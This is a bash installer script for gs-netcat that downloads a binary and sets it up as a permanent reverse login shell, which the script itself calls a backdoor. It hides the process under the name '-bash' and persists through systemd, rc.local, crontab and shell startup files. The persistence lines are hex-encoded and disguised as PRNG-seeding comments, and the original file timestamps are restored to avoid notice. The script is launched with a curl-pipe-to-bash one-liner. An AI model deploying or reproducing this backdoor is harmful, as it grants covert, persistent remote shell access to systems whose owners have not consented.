#! /usr/bin/env bash

# Install and start a permanent gs-netcat reverse login shell
#
# See https://www.gsocket.io/deploy/ for examples.
#
# This script is typically invoked like this as root or non-root user:
#   $ bash -c "$(curl -fsSL gsocket.io/x)"
#
# Connect
#   $ S=MySecret bash -c "$(curl -fsSL goscket.io/x)""
# Pre-set a secret:
#   $ X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
# Uninstall
#   $ GS_UNDO=1 bash -c" $(curl -fsSL gsocket.io/x)"
#
# Steps taken:
# 1. Download pre-compiled binary
# 2. Create a new secret (random)
# 3. Start gs-netcat as a interactive reverse login shell and hidden process
# 4. Install gs-netcat and automatically start after reboot
#
# Other variables:
# GS_DEBUG=1
# 		- Use binaries from ../packaging/gsnc-deploy-bin/
#		- Verbose output
#		- Shorter timeout to restart crontab etc
# GS_NOINST=1
#		- Do not install backdoor
# GS_PREFIX=path
#		- Use 'path' instead of '/' (needed for packaging/testing)

# Global Defines
URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
URL_DEPLOY="gsocket.io/x"
GS_VERSION=1.4.32
DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
# DL_CMD="$DL_CRL"
BIN_HIDDEN_NAME_DEFAULT=gs-bd
PROC_HIDDEN_NAME_DEFAULT=-bash
CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CC="\033[1;36m" # cyan
CM="\033[1;35m" # magenta
CN="\033[0m"    # none

if [[ -z "$GS_DEBUG" ]]; then
	DEBUGF(){ :;}
else
	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
fi

exit_clean()
{
	[[ "${#TMPDIR}" -gt 5 ]] && { rm -rf "${TMPDIR:?}/"*; rmdir "${TMPDIR}"; } &>/dev/null
	rm -rf "${GS_PREFIX}/etc/rc.local-old" &>/dev/null
	rm -rf "${GS_PREFIX}/etc/rc.local-new" &>/dev/null
}

exit_code()
{
	exit_clean

	exit "$1"
}

errexit()
{
	[[ -z "$1" ]] || echo -e 1>&2 "${CR}$*${CN}"

	exit_code 255
}

# When all was successfull
exit_alldone()
{
	echo 1>&1 "$*"
	exit_code 0
}

# Called _after_ init_vars() at the end of init_setup.
init_dstbin()
{
	# Try systemwide installation first
	DSTBIN="${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
	# check_rwx_bin "$DSTBIN"
	# [[ -n $IS_DIR_WREX ]] && return
	touch "$DSTBIN" &>/dev/null && { return; }

	# Try user installation
	mkdir -p "${GS_PREFIX}${HOME}/.usr/bin" &>/dev/null
	DSTBIN="${GS_PREFIX}${HOME}/.usr/bin/${BIN_HIDDEN_NAME}"
	touch "$DSTBIN" &>/dev/null && { return; }

	# Try /tmp/.gs
	DSTBIN="/tmp/.gs-${UID}/${BIN_HIDDEN_NAME}"
	touch "$DSTBIN" &>/dev/null && { return; }

	# Try /dev/shm as last resort
	# This is often mounted noexec (e.g. docker) 
	DSTBIN="/dev/shm/${BIN_HIDDEN_NAME}"
	touch "$DSTBIN" &>/dev/null && { return; }

	errexit "FAILED. Can not find writeable directory."
}

init_vars()
{
	# Select binary
	local arch
	arch=$(uname -m)
	if [[ $OSTYPE == *linux* ]]; then 
		if [[ x"$arch" == "xi686" ]] || [[ x"$arch" == "xi386" ]]; then
			OSARCH="i386-alpine"
		elif [[ x"$arch" == "xarmv6l" ]] || [[ x"$arch" == "xarmv7l" ]]; then
			OSARCH="armv6l-linux" # RPI-Zero / RPI 4b+
		elif [[ x"$arch" == "xaarch64" ]]; then
			OSARCH="aarch64-linux"
		elif [[ x"$arch" == "xmips64" ]]; then
			OSARCH="mips64-alpine"
		elif [[ x"$arch" == *mips* ]]; then
			OSARCH="mips32-alpine"
		fi
	elif [[ $OSTYPE == *darwin* ]]; then
		if [[ x"$arch" == "xarm64" ]]; then
			OSARCH="x86_64-osx" # M1
			# OSARCH="arm64-osx" # M1
		else
			OSARCH="x86_64-osx"
		fi
	elif [[ $OSTYPE == *FreeBSD* ]]; then
			OSARCH="x86_64-freebsd"
	elif [[ $OSTYPE == *cygwin* ]]; then
			OSARCH="x86_64-cygwin"
	# elif [[ $OSTYPE == *gnu* ]] && [[ "$(uname -v)" == *Hurd* ]]; then
			# OSARCH="i386-hurd" # debian-hurd
	fi

	[[ -z "$OSARCH" ]] && OSARCH="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit

	if [[ -d /dev/shm ]]; then
		TMPDIR="/dev/shm/.gs-${UID}"
	elif [[ -d /tmp ]]; then
		TMPDIR="/tmp/.gs-${UID}"
	fi

	SRC_PKG="gs-netcat_${OSARCH}.tar.gz"

	# Docker does not set USER
	[[ -z "$USER" ]] && USER=$(id -un)
	[[ -z "$UID" ]] && UID=$(id -u)

	# OSX's pkill matches the hidden name and not the original binary name.
	# Because we hide as '-bash' we can not pkill all -bash.
	# 'killall' however matches gs-bd and on OSX we thus force killall
	if [[ $OSTYPE == *darwin* ]]; then
		KL_CMD="killall"
		KL_CMD_UARG="-u${USER}"
	elif command -v pkill >/dev/null; then
		KL_CMD="pkill"
		KL_CMD_UARG="-U${UID}"
	elif command -v killall >/dev/null; then
		KL_CMD="killall"
		# cygwin's killall needs the name (not the uid)
		KL_CMD_UARG="-u${USER}"
	fi

	command -v "$KL_CMD" >/dev/null || WARN "No pkill or killall found."
	# command -v "$KL_CMD" >/dev/null || errexit "Need pkill or killall."

	# Defaults
	BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
	
	SEC_NAME="${BIN_HIDDEN_NAME_DEFAULT}.dat"
	PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"

	RCLOCAL_DIR="${GS_PREFIX}/etc"
	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"

	RC_FILENAME=".profile"
	RC_FILENAME_STATUS=".profile"
	if [[ -f ~/.bashrc ]]; then
		RC_FILENAME=".bashrc"
		RC_FILENAME_STATUS=".bashrc." # for status output ~/.bashrc.....[OK]
	fi
	RC_FILE="${GS_PREFIX}${HOME}/${RC_FILENAME}"

	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"

	DEBUGF "SRC_PKG=$SRC_PKG"

}

init_setup()
{
	if [[ -n "$GS_PREFIX" ]]; then
		# Debuggin and testing into separate directory
		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
		if [[ -f "${HOME}/${RC_FILENAME}" ]]; then
			cp "${HOME}/${RC_FILENAME}" "${RC_FILE}"
			touch -r "${HOME}/${RC_FILENAME}" "${RC_FILE}"
		fi
		cp /etc/rc.local "${GS_PREFIX}/etc/"
		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
	fi

	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"
	mkdir "$TMPDIR" &>/dev/null

	touch "${TMPDIR}/.gs-${UID}.lock" || errexit "FAILED. No temporary directory found for downloading package."
	rm -f "${TMPDIR}/.gs-${UID}.lock" 2>/dev/null

	# Find out which directory is writeable
	init_dstbin

	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"

	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""

	PROFILE_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})"
	CRONTAB_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""

	# check that xxd is working as expected (alpine linux does not have -r option)
	if [[ "$(echo "thcwashere" | xxd -ps -c1024 2>/dev/null| xxd -r -ps 2>/dev/null)" = "thcwashere" ]]; then
		local p
		p="$(echo "$RCLOCAL_LINE" | xxd -ps -c1024)"
		RCLOCAL_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"

		p="$(echo "$PROFILE_LINE" | xxd -ps -c1024)"
		PROFILE_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"

		p="$(echo "$CRONTAB_LINE" | xxd -ps -c1024)"
		CRONTAB_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
	fi
	DEBUGF "TMPDIR=${TMPDIR}"
	DEBUGF "DSTBIN=${DSTBIN}"
}

uninstall_rm()
{
	[[ -z "$1" ]] && return
	[[ ! -f "$1" ]] && return # return if file does not exist

	echo 1>&2 "Removing $1..."
	rm -rf "$1"
}

uninstall_rmdir()
{
	[[ -z "$1" ]] && return
	[[ ! -d "$1" ]] && return # return if file does not exist

	echo 1>&2 "Removing $1..."
	rmdir "$1"
}

uninstall_rc()
{
	[[ ! -f "$1" ]] && return # File does not exist

	grep "${BIN_HIDDEN_NAME}" "$1" &>/dev/null || return # not installed

	grep -v "${BIN_HIDDEN_NAME}" "$1" >"${1}-new" 2>/dev/null
	[[ ! -f "${1}-new" ]] && return # permission denied

	touch -r "$1" "${1}-new"
	mv "${1}-new" "$1"
	[[ ! -s "${1}" ]] && rm -f "${1}" 2>/dev/null # delete zero size file
}

# Rather important function especially when testing and developing this...
uninstall()
{
	uninstall_rm "${GS_PREFIX}${HOME}/.usr/bin/${BIN_HIDDEN_NAME}"
	uninstall_rm "${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"

	uninstall_rm "${RCLOCAL_DIR}/${SEC_NAME}"
	uninstall_rm "${GS_PREFIX}${HOME}/.usr/bin/${SEC_NAME}"
	uninstall_rm "${GS_PREFIX}/usr/bin/${SEC_NAME}"
	uninstall_rm "/dev/shm/${SEC_NAME}"

	uninstall_rmdir "${GS_PREFIX}${HOME}/.usr/bin"
	uninstall_rmdir "${GS_PREFIX}${HOME}/.usr"

	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
	uninstall_rm "${TMPDIR}/${SRC_PKG}"
	uninstall_rm "${TMPDIR}/._gs-netcat" # from docker???
	uninstall_rmdir "${TMPDIR}"

	# Remove from login script
	uninstall_rc "${GS_PREFIX}${HOME}/.bashrc"
	uninstall_rc "${GS_PREFIX}${HOME}/.profile"
	uninstall_rc "${GS_PREFIX}/etc/rc.local"

	# Remove crontab
	if [[ ! $OSTYPE == *darwin* ]]; then
		command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v "${BIN_HIDDEN_NAME}" | crontab - 2>/dev/null 
	fi

	# Remove systemd service
	# STOPPING would kill the current login shell. Do not stop it.
	# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" 2>/dev/null && systemctl daemon-reload 2>/dev/null; } 
	uninstall_rm "${SERVICE_FILE}"
	uninstall_rm "${SERVICE_DIR}/${SEC_NAME}"

	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
	echo -e 1>&2 "--> Use ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
	exit 0
}

SKIP_OUT()
{
	echo -e 1>&2 "[${CY}SKIPPING${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

OK_OUT()
{
	echo -e 1>&2 "......[${CG}OK${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

FAIL_OUT()
{
	echo -e 1>&2 "..[${CR}FAILED${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

WARN()
{
	echo -e 1>&2 "--> ${CY}WARNING: ${CN}$*"
}

WARN_EXECFAIL_SET()
{
	[[ -n "$WARN_EXECFAIL_MSG" ]] && return # set it once (first occurance) only
	WARN_EXECFAIL_MSG="CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
}

WARN_EXECFAIL()
{
	echo -e 1>&2 "--> Please send this output to ${CC}members@thc.org${CN} to get it fixed."
	echo -e 1>&2 "--> ${WARN_EXECFAIL_MSG}"
}

gs_secret_reload()
{
	[[ ! -f "$1" ]] && WARN "Oops. $1 not found. Uninstall needed?"
	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
	local sec
	sec=$(<"$1")
	[[ ${#sec} -gt 10 ]] && GS_SECRET=$sec
}

gs_secret_write()
{
	echo "$GS_SECRET" >"$1"
	chmod 600 "$1"
}

install_system_systemd()
{
	[[ ! -d "${GS_PREFIX}/etc/systemd/system" ]] && return
	command -v systemctl >/dev/null || return
	if [[ -f "${SERVICE_FILE}" ]]; then
		IS_INSTALLED=1
		IS_SKIPPED=1
		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
			IS_GS_RUNNING=1
		fi
		IS_SYSTEMD=1
		gs_secret_reload "$SYSTEMD_SEC_FILE" 
		SKIP_OUT "${SERVICE_FILE} already exists."
		return
	fi

	# Create the service file
	echo "[Unit]
Description=gs
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=10
WorkingDirectory=/root
ExecStart=/bin/bash -c \"GSOCKET_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\"

[Install]
WantedBy=multi-user.target" >"${SERVICE_FILE}"

	chmod 600 "${SERVICE_FILE}"
	gs_secret_write "$SYSTEMD_SEC_FILE"

	(systemctl enable "${SERVICE_HIDDEN_NAME}" && \
	systemctl start "${SERVICE_HIDDEN_NAME}" && \
	systemctl is-active "${SERVICE_HIDDEN_NAME}") &>/dev/null || { systemctl disable "${SERVICE_HIDDEN_NAME}" 2>/dev/null; rm -f "${SERVICE_FILE}"; return; } # did not work...

	IS_SYSTEMD=1
	IS_GS_RUNNING=1
	IS_INSTALLED=1
}

install_system_rclocal()
{
	[[ ! -f "${RCLOCAL_FILE}" ]] && return
	if grep "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
		IS_INSTALLED=1
		IS_SKIPPED=1
		gs_secret_reload "$RCLOCAL_SEC_FILE" 
		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
		return	
	fi

	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.
	(head -n1 "${RCLOCAL_FILE}" && \
	echo "$NOTE_DONOTREMOVE" && \
	echo "$RCLOCAL_LINE" && \
	tail -n +2 "${RCLOCAL_FILE}") >"${RCLOCAL_FILE}-new" 2>/dev/null || return # not writeable

	# restore file's timestamp
	touch -r "${RCLOCAL_FILE}" "${RCLOCAL_FILE}-new"
	mv "${RCLOCAL_FILE}-new" "${RCLOCAL_FILE}"

	gs_secret_write "$RCLOCAL_SEC_FILE"

	IS_INSTALLED=1
}

install_system()
{
	echo -en 2>&1 "Installing systemwide remote access permanentally....................."

	# Try systemd first
	install_system_systemd

	# Try good old /etc/rc.local
	[[ -z "$IS_INSTALLED" ]] && install_system_rclocal

	[[ -z "$IS_INSTALLED" ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }

	OK_OUT
}

install_user_crontab()
{
	command -v crontab >/dev/null || return # no crontab
	echo -en 2>&1 "Installing access via crontab........................................."
	[[ -z "$KL_CMD" ]] && { FAIL_OUT "No pkill or killall found."; return; }
	if crontab -l 2>/dev/null | grep "$BIN_HIDDEN_NAME" &>/dev/null; then
		IS_INSTALLED=1
		IS_SKIPPED=1
		gs_secret_reload "$USER_SEC_FILE"
		SKIP_OUT "Already installed in crontab."
		return
	fi

	local cr_time
	cr_time="59 * * * *"
	[[ -n "$GS_DEBUG" ]] && cr_time="* * * * *" # easier to debug if this happens every minute..
	(crontab -l 2>/dev/null && \
	echo "$NOTE_DONOTREMOVE" && \
	echo "${cr_time} $CRONTAB_LINE") | crontab - 2>/dev/null || { FAIL_OUT; return; }

	IS_INSTALLED=1
	OK_OUT
}

install_user_profile()
{
	echo -en 2>&1 "Installing access via ~/${RC_FILENAME_STATUS}......................................"
	[[ -z "$KL_CMD" ]] && { FAIL_OUT "No pkill or killall found."; return; }
	[[ -f "${RC_FILE}" ]] || { touch "${RC_FILE}"; chmod 600 "${RC_FILE}"; }
	if grep "$BIN_HIDDEN_NAME" "$RC_FILE" &>/dev/null; then
		IS_INSTALLED=1
		IS_SKIPPED=1
		gs_secret_reload "$USER_SEC_FILE"
		SKIP_OUT "Already installed in ${RC_FILE}"
		return
	fi

	(echo "$NOTE_DONOTREMOVE" && \
	echo "${PROFILE_LINE}" && \
	cat "${RC_FILE}") >"${RC_FILE}-new"

	touch -r "${RC_FILE}" "${RC_FILE}-new"
	mv "${RC_FILE}-new" "${RC_FILE}"

	IS_INSTALLED=1
	OK_OUT
}

install_user()
{
	# Do not use crontab on OSX: It pops a warning to the user
	if [[ ! $OSTYPE == *darwin* ]]; then
		install_user_crontab
	fi

	# install_user_profile
	install_user_profile

	[[ -z "$IS_SKIPPED" ]] && gs_secret_write "$USER_SEC_FILE" # Create new secret file
}

ask_nocertcheck()
{
	WARN "Can not verify host. CA Bundle is not installed."
	echo "--> Attempting without certificate verification."
	echo "--> Press any key to continue or CTRL-C to abort..."
	echo -en 1>&2 -en "--> Continuing in "
	local n

	n=10
	while :; do
		echo -en 1>&2 "${n}.."
		n=$((n-1))
		[[ $n -eq 0 ]] && break 
		read -t1 -n1 && break
	done
	[[ $n -gt 0 ]] || echo 1>&2 "0"

	GS_NOCERTCHECK=1
}

# Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
# <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
dl_ssl()
{
	if [[ -z $GS_NOCERTCHECK ]]; then
		DL_LOG=$("$3" "$4" "$5" "$6" "$7" 2>&1)
		[[ "${DL_LOG}" != *"$2"* ]] && return
	fi

	if [[ -z $GS_NOCERTCHECK ]]; then
		SKIP_OUT
		ask_nocertcheck
	fi
	[[ -z $GS_NOCERTCHECK ]] && return

	echo -en 2>&1 "Downloading binaries without certificate verification................."
	DL_LOG=$("$3" "$1" "$4" "$5" "$6" "$7" 2>&1)
}

# Download $1 and save it to $2
dl()
{
	[[ -s "$2" ]] && return

	# Need to set DL_CMD before GS_DEBUG check for proper error output
	if command -v curl >/dev/null; then
		DL_CMD="$DL_CRL"
	elif command -v wget >/dev/null; then
		DL_CMD="$DL_WGT"
	else
		# errexit "Need curl or wget."
		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
		errexit
	fi

	# Debugging / testing. Use local package if available
	if [[ -n "$GS_DEBUG" ]]; then
		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && cp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
		[[ -f "/gsocket-pkg/${1}" ]] && cp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
		FAIL_OUT "GS_DEBUG set but deployment binaries not found (${1})..."
		errexit
	fi

	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
		dl_ssl "-k" "certificate problem" "curl" "-fL" "${URL_BASE}/${1}" "--output" "${2}"
	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
		dl_ssl "--no-check-certificate" "is not trusted" "wget" "" "${URL_BASE}/${1}" "-O" "${2}"
	else
		# errexit "Need curl or wget."
		FAIL_OUT "CAN NOT HAPPEN"
		errexit
	fi

	# [[ ! -s "$2" ]] && { errexit "Could not download package."; } 
	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_LOG"; exit_code 255; } 
}

# S= was set. Do not install but execute in place.
gs_access()
{
	echo -e 2>&1 "Connecting..."
	local ret
	GS_SECRET="${S}"

	"${DSTBIN}" -s "${GS_SECRET}" -i
	ret=$?
	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$?" "SIGSEGV"; WARN_EXECFAIL; errexit; }

	exit_code "$ret"
}

gs_update()
{
	echo -en 2>&1 "Checking existing binaries............................................"

	command -v gs-netcat >/dev/null || { FAIL_OUT "gs-netcat not found."; exit 255; }
	OK_OUT

	local gsnc_bin
	gsnc_bin="$(command -v gs-netcat)"

	echo -en 2>&1 "Backup old binaries..................................................."
	err_log=$(mv -f "${gsnc_bin}" "${gsnc_bin}-old" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
	OK_OUT

	echo -en 2>&1 "Updating binaries....................................................."

	err_log=$(mv -f "${DSTBIN}" "${gsnc_bin}" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
	OK_OUT

	echo -en 2>&1 "Testing updated binaries.............................................."
	ver_new="$(gs-netcat -h 2>&1 | grep GS)"
	[[ "$ver_new" =~ "$GS_VERSION" ]] || { FAIL_OUT "Wrong version: $ver_new"; exit 255; }

	OK_OUT "Updated to $ver_new"
	exit 0
}

# Binary is in an executeable directory (no noexec-flag)
# set IS_TESTBIN_OK if binary worked.
# test_bin <binary>
test_bin()
{
	local bin
	local err_log
	unset IS_TESTBIN_OK

	bin="$1"

	GS_SECRET=$("$bin" -g 2>/dev/null)
	[[ -z "$GS_SECRET" ]] && { FAIL_OUT; ERR_LOG="wrong binary"; WARN_EXECFAIL_SET "$?" "wrong binary"; return; }

	err_log=$(GSOCKET_ARGS="-s selftest-${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${bin}" 2>&1)
	ret=$?

	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
	[[ $ret -eq 139 ]] && { FAIL_OUT; ERR_LOG=""; WARN_EXECFAIL_SET "$?" "SIGSEGV"; return; }
	# Fail unless it's ECONNREFUSED
	[[ $ret -ne 61 ]] && { FAIL_OUT; WARN_EXECFAIL_SET 0 "default pkg failed"; return; }

	# exit code of gs-netcat was ECONNREFUSED. Thus connection to server
	# was successfully and server replied that no client is listening. 
	# This is a good enough test that this binary is working.
	IS_TESTBIN_OK=1
}

# try <osarch> <is_with_warning>
try()
{
	local osarch
	local is_with_warning
	local src_pkg
	osarch="$1"
	is_with_warning="$2"

	src_pkg="gs-netcat_${osarch}.tar.gz"
	echo -e 2>&1 "--> Trying ${CG}${osarch}${CN}"
	# Download binaries
	echo -en 2>&1 "Downloading binaries.................................................."
	dl "gs-netcat_${osarch}.tar.gz" "${TMPDIR}/${src_pkg}"
	OK_OUT

	echo -en 2>&1 "Unpacking binaries...................................................."
	# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
	(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
	[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
	OK_OUT

	echo -en 2>&1 "Copying binaries......................................................"
	mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
	chmod 700 "$DSTBIN"
	OK_OUT

	echo -en 2>&1 "Testing binaries......................................................"
	test_bin "${DSTBIN}"
	if [[ -n "$IS_TESTBIN_OK" ]]; then
		OK_OUT
		return
	fi

	rm -f "${TMPDIR}/${src_pkg}"
	[[ -z "$is_with_warning" ]] && return # silent return
}

# Download the gs-netcat_any-any.tar.gz and try all of the containing
# binaries and fail hard if none could be found.
try_any()
{
	targets="x86_64-alpine i386-alpine x86_64-debian aarch64-linux armv6l-linux x86_64-cygwin x86_64-freebsd x86_64-osx"
	for osarch in $targets; do
		[[ x"$osarch" = x"$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
		try "$osarch"
		[[ -n "$IS_TESTBIN_OK" ]] && break
	done


	if [[ -n "$IS_TESTBIN_OK" ]]; then
		echo -e >&2 "--> ${CY}Installation did not go as smooth as it should have.${CN}"
	else
		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
	fi
	WARN_EXECFAIL
	[[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
}


init_vars

[[ x"$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall

init_setup

try "$OSARCH" 1
[[ -z "$IS_TESTBIN_OK" ]] && try_any

[[ -n "$GS_UPDATE" ]] && gs_update

# S= is set. Do not install but connect to remote using S= as secret.
[[ -n "$S" ]] && gs_access

# User supplied secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
[[ -n "$X" ]] && GS_SECRET="$X"

# -----BEGIN Install permanentally-----
# Try to install system wide. This may also start the service.
[[ -z $GS_NOINST ]] && [[ $UID -eq 0 ]] && install_system

# Try to install to user's login script or crontab
[[ -z $GS_NOINST ]] && [[ -z "$IS_INSTALLED" ]] && install_user

[[ -n $GS_NOINST ]] && echo -e 2>&1 "GS_NOINST is set. Skipping installation."
# -----END Install permanentally-----

if [[ -z "$IS_INSTALLED" ]]; then
	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
fi
# After all install attempts output help how to uninstall
echo -e 1>&2 "--> To uninstall type ${CM}GS_UNDO=1 ${DL_CMD}${CN}"

printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
if [[ -n "$IS_SYSTEMD" ]]; then
	# HERE: It's systemd
	if [[ -z "$IS_GS_RUNNING" ]]; then
		systemctl start "${SERVICE_HIDDEN_NAME}" &>/dev/null
		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
			IS_GS_RUNNING=1
		else
			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
			exit_code 255
		fi
	fi
	if [[ -n "$IS_SKIPPED" ]]; then
		SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
	else
		OK_OUT
	fi
elif [[ -z "$IS_GS_RUNNING" ]]; then
	# Scenario to consider:
	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-bd'
	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
	# Now two gs-bd's are running (which is correct)
	if [[ -n "$KL_CMD" ]]; then
		${KL_CMD} -0 "$KL_CMD_UARG" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
	elif command -v pidof >/dev/null; then
		# if no pkill/killall then try pidof (but we cant tell which user...)
		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
			IS_OLD_RUNNING=1
		fi
	fi
	IS_NEED_START=1

	if [[ -n "$IS_OLD_RUNNING" ]]; then
		# HERE: already running.
		if [[ -n "$IS_SKIPPED" ]]; then
			# HERE: Already running. Skipped installation (sec.dat has not changed).
			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
			unset IS_NEED_START
		else
			OK_OUT
			WARN "More than one ${BIN_HIDDEN_NAME} is running. You"
			echo -e 1>&2 "             may want to check: ${CM}ps -elf|grep -- ${PROC_HIDDEN_NAME}${CN}"
			echo -e 1>&2 "             or terminate all : ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN}"
		fi
	else
		OK_OUT ""
	fi

	if [[ -n "$IS_NEED_START" ]]; then
		(TERM=xterm-256color GSOCKET_ARGS="-s $GS_SECRET -liD" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN")
		IS_GS_RUNNING=1
	fi
fi

echo -e 1>&2 "--> To connect type one of the following:
--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
--> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
--> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"


exit_code 0
